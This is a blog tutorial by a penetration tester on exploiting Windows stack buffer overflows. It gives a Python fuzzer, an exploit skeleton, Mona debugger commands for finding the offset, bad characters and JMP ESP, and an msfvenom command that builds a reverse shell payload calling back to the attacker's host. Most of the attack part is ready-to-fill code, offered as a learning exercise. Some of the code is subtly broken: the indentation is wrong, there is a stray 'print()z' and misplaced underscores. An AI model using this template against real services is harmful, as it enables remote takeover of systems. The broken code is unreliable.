---
layout: post
title: Buffer Overflow Overview
author: Mitchell Stein
tags:
- jekyll theme
- jekyll
date: 2021-11-02
tags: [buffer overflow, general, windows]
categories: [Tools]
toc:  true
---

Buffer overflows are a must have for any penetration testers arsenal.

To perform a buffer overflow attack, some setup is needed for it to be effective and to not crash any production or business critical applications.

## Setup

First off, If possible you must download a copy of the vulnerable application to your own testing machine running your choice of debugging program. For this example we will use [Immunity Debugger](https://www.immunityinc.com/products/debugger/) along with an additional script add-on called [Mona.py](https://github.com/corelan/mona).

![Immunity Debugger with Mona.py](https://mitchelldstein.github.io/assets/images/BufferOverflow/ImmunityDebugger.png)

## Fuzzing

Fuzzing is the process of finding errors and security flaws in software or networks. Fuzzing for buffer overflows involved sending larger and larger commands into the program in hopes to crash it and log the length of the command.

Here is a fuzzer made in python that will interact with the running application and log the length of the command sent.

### **_Fuzzer.py:_**

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "<cmd if needed>"

string = prefix + "A" * 100

while True:
    try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
```

Run this command against the network facing program and log the number of bytes it crashed at. As a good rule of thumb always add +400 to the crashed bytes.

## Crash Replication & EIP Control

For the sake of the example, lets say the program crashed at 600 bytes, lets add 400 to it and generate a non-repeating pattern so we can view the exact place in which the program crashed.

```shell
$ /usr/bin/msf-pattern_create -l 1000
Aa0Aa1Aa2Aa3A . . . 7Bg8Bg9Bh0Bh1Bh2B
```

With the pattern we will start to create our exploit to craft our final payload.

### **_Exploit.py_**

```python
import socket

ip = "MACHINE_IP"
port = <port>

prefix = "<optional command>"
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = "Aa0Aa1Aa2Aa3A . . . 7Bg8Bg9Bh0Bh1Bh2B"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```

To find the crash point for code injection, you can use Mona.py.

```shell
!mona findmsp -distance 1000
```

Mona will reply back with

```text
EIP contains normal pattern : … (XXX)
```

In **_Exploit.py_** set the offset varialbe to XXX

## Generate bytearray and find bad characters

```python
#!/bin/python3
for x in range(1, 256):
    print("\\x" + "{:02x}".format(x), end='')
print()z
```

```shell
$ !mona bytearray -b "\x00< + bad chars>"
$ !mona compare -f C:\mona\%p\bytearray.bin -a <address>
```

Close bytes can also corrupt near ones. Remove the first byte from the pair and retry. For example if you have 0x1a0x1b, remove 0x1a first then rerun the test.

## Find the JMP ESP

```shell
$!mona jmp -r esp
```

## Generate payload

```shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<found bad chars>" -f c
```

Add payload to **_Exploit.py_** > payload = ("****\_****")

### Extra

Maybe add some prepend NOPs to **_Exploit.py_**

```shell
overflow = "\x90" _ <overflow>
padding = "\x90" _ 16
```
